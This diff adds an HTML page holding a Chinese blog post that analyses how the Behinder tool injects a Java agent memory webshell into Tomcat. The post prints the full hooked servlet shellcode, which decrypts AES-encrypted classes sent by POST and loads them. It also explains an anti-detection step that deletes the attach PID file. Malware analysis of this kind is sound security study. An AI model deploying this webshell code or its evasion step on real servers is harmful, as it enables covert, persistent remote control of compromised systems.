@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>浅析behinder agent内存马注入 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">浅析behinder agent内存马注入</h1>
+    <div class="post-meta">
+      <time datetime="2025-08-15">2025-08-15</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/19040390">https://www.cnblogs.com/Zephyr07/articles/19040390</a></p>
+</blockquote>
+<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>学习了内存马之后，想到了behinder和godzilla这两款现在在实战中常用的内存马注入工具，这篇文章就先分析一下behinder工具注入的内存马的核心源码吧，也为以后二开工具做个铺垫</p>
+<h1 id="0x01-工具"><a href="#0x01-工具" class="headerlink" title="0x01 工具"></a>0x01 工具</h1><p>IDEA</p>
+<p>behinder V3.0_Beta_11</p>
+<h1 id="0x02-前期准备"><a href="#0x02-前期准备" class="headerlink" title="0x02 前期准备"></a>0x02 前期准备</h1><p>因为在后续的分析过程中多要看一些代码，调试分析对理解源码也有很大的帮助，所以先配置一下调试的环境</p>
+<h2 id="1-首先用idea启动一个tomcat的服务"><a href="#1-首先用idea启动一个tomcat的服务" class="headerlink" title="1.首先用idea启动一个tomcat的服务"></a>1.首先用idea启动一个tomcat的服务</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815210824741-1310891401.png" alt="image"></p>
+<h2 id="2-然后生成一个behinder的jsp马，然后用behinder连接"><a href="#2-然后生成一个behinder的jsp马，然后用behinder连接" class="headerlink" title="2.然后生成一个behinder的jsp马，然后用behinder连接"></a>2.然后生成一个behinder的jsp马，然后用behinder连接</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815210833177-1390303374.png" alt="image"></p>
+<h2 id="3-用idea打开behinder-jar包，然后添加为库后打开"><a href="#3-用idea打开behinder-jar包，然后添加为库后打开" class="headerlink" title="3.用idea打开behinder.jar包，然后添加为库后打开"></a>3.用idea打开behinder.jar包，然后添加为库后打开</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815210841606-1628800501.png" alt="image"></p>
+<h2 id="4-然后新建远程JVM调试"><a href="#4-然后新建远程JVM调试" class="headerlink" title="4.然后新建远程JVM调试"></a>4.然后新建远程JVM调试</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815210848490-258186959.png" alt="image"></p>
+<p>apply之后，打开behinder.jar所在目录，使用如下命令运行jar包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=y,address=5005 Behinder.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815210855917-977988739.png" alt="image"></p>
+<p>然后返回idea，点击调试运行即可</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815210901466-455698613.png" alt="image"></p>
+<h1 id="0x03-代码分析"><a href="#0x03-代码分析" class="headerlink" title="0x03 代码分析"></a>0x03 代码分析</h1><h2 id="定位代码"><a href="#定位代码" class="headerlink" title="定位代码"></a>定位代码</h2><p>net.rebeyond.behinder.ui.controller.MainController#injectMemShell（看方法名字就是注入shell）</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815210907686-496669308.png" alt="image"></p>
+<p>看一下代码，首先是会去检测注入路径开头是否是&#x2F;，如果不是就报错</p>
+<ul>
+<li>path：注入路径</li>
+<li>shellEntity：选中的shell的系统信息</li>
+<li>osInfo：操作系统信息</li>
+</ul>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815210914205-90239244.png" alt="image"></p>
+<p>然后获取到shell信息和操作系统信息后，根据操作系统拼接临时目录来存放之后被注入的jar包：linux是&#x2F;tmp&#x2F;{随机字符}，windows是c:&#x2F;windows&#x2F;temp&#x2F;{随机字符}</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815210921506-1038570325.png" alt="image"></p>
+<p>然后就到了内存马注入的关键三步，分别是上传jar包，加载jar，注入内存马</p>
+<blockquote>
+<p>（和我们之前学的agent修改字节码是极为相似的，而事实上他的确是采用Instrumentation + javaassist 对http相关类进行hook的方法，实现内存webshell）</p>
+</blockquote>
+<h2 id="第一步：uploadFile"><a href="#第一步：uploadFile" class="headerlink" title="第一步：uploadFile"></a>第一步：uploadFile</h2><p>咱们先看上传jar包的uploadFile</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815210935415-804792013.png" alt="image"></p>
+<p>libpath是临时目录（linux是&#x2F;tmp&#x2F;{随机字符}，windows是c:&#x2F;windows&#x2F;temp&#x2F;{随机字符}），然后会根据操作系统的不同选择上传不同的jar包，这些jar包存放在net&#x2F;rebeyond&#x2F;behinder&#x2F;resource&#x2F;tools目录下</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815210940701-690573159.png" alt="image"></p>
+<blockquote>
+<p>题外：这里我们把tools_0.jar包提取出来，之后分析一下该jar包</p>
+</blockquote>
+<h2 id="第二步：loadjar"><a href="#第二步：loadjar" class="headerlink" title="第二步：loadjar"></a>第二步：loadjar</h2><p>分析完uploadFile方法，我们再去看一下loadjar方法</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815210956854-1092411302.png" alt="image"></p>
+<p>我们看byte[] data &#x3D; Utils.getData(this.currentKey, this.encryptType, “Loader”, params, this.currentType);这行代码</p>
+<p>这行代码的作用是调用工具类<code>Utils</code>的<code>getData</code>方法，生成用于网络请求的加密数据字节数组，并且它还会获取一个classname为Loader的class字节码，我们全局搜索该类发现在net.rebeyond.behinder.payload.java</p>
+<blockquote>
+<p>这里我在网上看了一些其他师傅的文章就是图中我用框框住的部分是behinder客户端和shell交互的典型写法，将参数放入一个map，对应的是payload类中的一个成员变量，然后获取net.rebeyond.behinder.payload.java中名字是Loader的class字节码，然后通过javassist修改class的字节码，将map中与payload中对应的成员变量的值赋值给它，然后发送给webshell，webshell执行payload中的equals方法后返回结果（这里的payload就是Loader.class</p>
+</blockquote>
+<p>我们跟到net.rebeyond.behinder.payload.java.Loader中看一下</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815211017023-539974816.png" alt="image"></p>
+<p>看一下代码我们发现它用libpath初始化了一个url对象，然后通过反射调用了URLCLassLoader.addURL()方法，就是将libpath(jar包路径)添加到搜索路径中去，就类似添加到环境变量当中去</p>
+<p>然后jvm通过文件名搜索这个到这个路径下的这个文件（jar包）</p>
+<h2 id="第三步：injectMemShell"><a href="#第三步：injectMemShell" class="headerlink" title="第三步：injectMemShell"></a>第三步：injectMemShell</h2><p>回到三步中的最后一步injectMemShell</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815211024307-1323676112.png" alt="image"></p>
+<ul>
+<li>type：类型，只有agent</li>
+<li>path：用来访问内存马的url</li>
+<li>isAntiAgent：是否启用防检测</li>
+</ul>
+<p>跟进injectMemShell方法</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815211030008-995049798.png" alt="image"></p>
+<p>和loadjar的有点像，先给payload的成员变量赋值并放入一个map中，然后将payload发送给沦陷主机上</p>
+<p>看byte[] data &#x3D; Utils.getData(this.currentKey, this.encryptType, “MemShell”, params, this.currentType);这行代码</p>
+<p>根据密钥，加密类型以及map类型的存放变量的params字段和内存马type去依靠Memshell类去getData获取数据</p>
+<p>跟进MemShell看一下net.rebeyond.behinder.payload.java.MemShell（一样全局搜索MemShell）</p>
+<blockquote>
+<p>这部分代码在执行的时候，已经是在受害者机器，由冰蝎webshell加载执行，程序入口是equals()函数，所以注入调试的时候没法跟进去</p>
+</blockquote>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815211037296-2025699451.png" alt="image"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815211046383-941625307.png" alt="image"></p>
+<p>首先是把<code>jdk.attach.allowAttachSelf</code>属性设置为true（有哪位师傅可以解惑，不太清楚这里的作用是什么），其次是调用了fillContext()方法用来初始化类的request，response和session，原因是内存马不像jsp文件的话是有全局变量可以直接获取，而是需要从context中获取</p>
+<p>后面就是三个type判断，因为这个版本是只有agent内存马，暂时还不支持filter和servlet两种类型，可能之后的版本会有，到时候找到了也分析一下qwq</p>
+<h2 id="小结："><a href="#小结：" class="headerlink" title="小结："></a>小结：</h2><p>对比当时agent学习：</p>
+<p>首先就是通过shell上传恶jar包到对应的操作系统，这一步就相当于agent当时中的将项目和恶意类一起打包成jar包</p>
+<p>然后就是loadjar加载jar包去找项目对应的jvm进程</p>
+<p>最后就是通过injectmemshell来去修改字节码去实现内存马的注入</p>
+<h1 id="0x04-恶意jar包分析"><a href="#0x04-恶意jar包分析" class="headerlink" title="0x04 恶意jar包分析"></a>0x04 恶意jar包分析</h1><p>我们反编译tools_0.jar</p>
+<p>打开之后javassist包下的不用看，他是javassist字节码修改时用到的一些核心类，我们看net&#x2F;rebeyond&#x2F;behinder&#x2F;payload&#x2F;java下的memshell（其实这里发现和behinder客户端的memshell代码是一样的）</p>
+<p>看关键方法agentmain</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815211105792-1230566846.png" alt="image"> 在定义shellcode之前的一大段代码都是初始化几个变量</p>
+<ul>
+<li>classes是全部已加载的类</li>
+<li>targetclasses存放了不同java版本的和中间件的request和response的类名来对应不同的场景</li>
+</ul>
+<p>然后我们看一下shellcode也就是内存版webshell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">javax.servlet.http.HttpServletRequest request = (javax.servlet.ServletRequest) $1;</span><br><span class="line">javax.servlet.http.HttpServletResponse response = (javax.servlet.ServletResponse) $2;</span><br><span class="line">javax.servlet.http.HttpSession session = request.getSession();</span><br><span class="line">String pathPattern = &quot;%s&quot;;</span><br><span class="line"></span><br><span class="line">if (request.getRequestURI().matches(pathPattern)) &#123;</span><br><span class="line">    java.util.Map obj = new java.util.HashMap();</span><br><span class="line">    obj.put(&quot;request&quot;, request);</span><br><span class="line">    obj.put(&quot;response&quot;, response);</span><br><span class="line">    obj.put(&quot;session&quot;, session);</span><br><span class="line"></span><br><span class="line">    ClassLoader loader = this.getClass().getClassLoader();</span><br><span class="line"></span><br><span class="line">    if (request.getMethod().equals(&quot;POST&quot;)) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String k = &quot;%s&quot;;</span><br><span class="line">            session.putValue(&quot;u&quot;, k);</span><br><span class="line"></span><br><span class="line">            java.lang.ClassLoader systemLoader = java.lang.ClassLoader.getSystemClassLoader();</span><br><span class="line">            Class cipherCls = systemLoader.loadClass(&quot;javax.crypto.Cipher&quot;);</span><br><span class="line">            Object c = cipherCls.getDeclaredMethod(&quot;getInstance&quot;, new Class[]&#123;String.class&#125;)</span><br><span class="line">                                .invoke(cipherCls, new Object[]&#123;&quot;AES&quot;&#125;);</span><br><span class="line">            Object keyObj = systemLoader.loadClass(&quot;javax.crypto.spec.SecretKeySpec&quot;)</span><br><span class="line">                                .getDeclaredConstructor(new Class[]&#123;byte[].class, String.class&#125;)</span><br><span class="line">                                .newInstance(new Object[]&#123;k.getBytes(), &quot;AES&quot;&#125;);</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.Method initMethod = cipherCls.getDeclaredMethod(&quot;init&quot;, new Class[]&#123;int.class, systemLoader.loadClass(&quot;java.security.Key&quot;)&#125;);</span><br><span class="line">            initMethod.invoke(c, new Object[]&#123;2, keyObj&#125;);</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.Method doFinalMethod = cipherCls.getDeclaredMethod(&quot;doFinal&quot;, new Class[]&#123;byte[].class&#125;);</span><br><span class="line">            byte[] requestBody = null;</span><br><span class="line"></span><br><span class="line">            try &#123;</span><br><span class="line">                Class Base64 = loader.loadClass(&quot;sun.misc.BASE64Decoder&quot;);</span><br><span class="line">                Object Decoder = Base64.newInstance();</span><br><span class="line">                requestBody = (byte[]) Decoder.getClass().getMethod(&quot;decodeBuffer&quot;, new Class[]&#123;String.class&#125;)</span><br><span class="line">                                              .invoke(Decoder, new Object[]&#123;request.getReader().readLine()&#125;);</span><br><span class="line">            &#125; catch (Exception ex) &#123;</span><br><span class="line">                Class Base64 = loader.loadClass(&quot;java.util.Base64&quot;);</span><br><span class="line">                Object Decoder = Base64.getDeclaredMethod(&quot;getDecoder&quot;, new Class[0]).invoke(null, new Object[0]);</span><br><span class="line">                requestBody = (byte[]) Decoder.getClass().getMethod(&quot;decode&quot;, new Class[]&#123;String.class&#125;)</span><br><span class="line">                                              .invoke(Decoder, new Object[]&#123;request.getReader().readLine()&#125;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            byte[] buf = (byte[]) doFinalMethod.invoke(c, new Object[]&#123;requestBody&#125;);</span><br><span class="line">            java.lang.reflect.Method defineMethod = java.lang.ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;, new Class[]&#123;String.class, java.nio.ByteBuffer.class, java.security.ProtectionDomain.class&#125;);</span><br><span class="line">            defineMethod.setAccessible(true);</span><br><span class="line"></span><br><span class="line">            java.lang.reflect.Constructor constructor = java.security.SecureClassLoader.class.getDeclaredConstructor(new Class[]&#123;java.lang.ClassLoader.class&#125;);</span><br><span class="line">            constructor.setAccessible(true);</span><br><span class="line">            java.lang.ClassLoader cl = (java.lang.ClassLoader) constructor.newInstance(new Object[]&#123;loader&#125;);</span><br><span class="line">            java.lang.Class loadedClass = (java.lang.Class) defineMethod.invoke(cl, new Object[]&#123;null, java.nio.ByteBuffer.wrap(buf), null&#125;);</span><br><span class="line">            loadedClass.newInstance().equals(obj);</span><br><span class="line">        &#125; catch (java.lang.Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; catch (java.lang.Error error) &#123;</span><br><span class="line">            error.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>通过 POST 请求接收加密的类字节码</li>
+<li>使用 AES 解密和 Base64 解码还原字节码</li>
+<li>利用反射和自定义类加载器将字节码动态加载为 Java 类</li>
+<li>实例化新类并传递 Web 请求上下文，实现远程动态扩展和控制</li>
+</ul>
+<p>但其实这段代码长的主要原因是因为很多类和方法无法从内存中直接获取，都需要反射获取</p>
+<p>然后继续看后面的</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815211121604-1097326940.png" alt="image"></p>
+<ul>
+<li>首先遍历 JVM 已加载的所有类，筛选出在 <code>targetClasses</code> 列表中的目标类（如 <code>javax.servlet.http.HttpServlet</code>、<code>jakarta.servlet.http.HttpServlet</code>）</li>
+<li>从传入的参数中取出要绑定的url和password，对shellCode进行格式化，并根据发现已加载的类名，修改shellCode中import的类名</li>
+<li>然后就是使用javassist将shellcode插入到<code>ServletRequest#service</code>和<code>ServletResponse#service</code>之间，这样所有的http请求都会先经过注入的恶意代码处理，这样就完成了hook的操作</li>
+</ul>
+<h1 id="0x05-isAntiAgent防检测分析"><a href="#0x05-isAntiAgent防检测分析" class="headerlink" title="0x05 isAntiAgent防检测分析"></a>0x05 isAntiAgent防检测分析</h1><p>在上面分析injectMemShell的时候，有一个参数是isAntiAgent对应的是gui界面中的是否开启防检测功能</p>
+<p>跟进injectMemShell发现isAntiAgent的boolean值赋值到成员变量antiAgent</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815211133860-1869917119.png" alt="image"></p>
+<p>我们去全局搜索antiAgent，找到了处理该参数的地方</p>
+<p>net.rebeyond.behinder.payload.java.MemShell#doAgentShell</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815211140374-1426225438.png" alt="image"></p>
+<ul>
+<li>通过系统类加载器加载 <code>com.sun.tools.attach.VirtualMachine</code>，这是 Java Attach API 的核心类，用于远程或本地 JVM 进程的动态操作</li>
+<li>获取 <code>attach</code> 方法（用于连接到指定 PID 的 JVM）。</li>
+<li>获取 <code>loadAgent</code> 方法（用于向目标 JVM 加载 agent jar，并传递参数）</li>
+<li>通过 <code>attach</code> 连接到当前 JVM 进程（<code>getCurrentPID()</code>）。</li>
+<li>通过 <code>loadAgent</code> 注入 agent jar（<code>libPath</code>），并传递参数（路径和密码，均 base64 编码）</li>
+<li>如果是 Linux 且 <code>antiAgent</code> 为 true，则删除 <code>/tmp/.java_pid[PID]</code> 文件</li>
+</ul>
+<p>而且我们可以看这一段</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815211148165-1000614493.png" alt="image"></p>
+<p>loadAgentMethod.invoke的时候并没有传入antiAgent，所以说并没有把是否启用防检测参数传给jar包，那么jar包就无法判断是否要启动防检测，所以只能是在客户端这里完成，而不是由jar包去完成删除<code>/tmp/.java_pid[PID]</code> 文件这一步骤</p>
+<p>至于为什么删除&#x2F;tmp&#x2F;.java_pid[PID] 文件，就可以防检测，请见以下回答：</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202508/3551469-20250815211155257-1108305072.png" alt="image"></p>
+<h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>这一篇文章就是简单的分析了一下这个behinder agent注入的简单流程，有一些复杂的地方还没有研究明白，但是总体而言大致流程其实和我们学习agent的时候是相同的，只不过在实际环境中涉及到这个网络通信以及具体的注入的时候要复杂的多，所以后续还会再继续分析，比如像filter\servlet内存马的注入，以及他这个shell拿到之后执行命令的这个加密通信是如何实现的等</p>
+<p>在这里我只能说能写出这个东西的人真是太d了！</p>
+<p>最后我agent的学习笔记见：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/19035903">Java agent(一) - Zephyr07 - 博客园</a></p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/08/21/JDBC-MySQL%E4%B8%8D%E5%87%BA%E7%BD%91%E5%88%A9%E7%94%A8/" class="prev">← JDBC MySQL不出网利用</a>
+    
+    
+      <a href="/2025/08/13/Java-agent-%E4%B8%80/" class="next">Java agent(一) →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
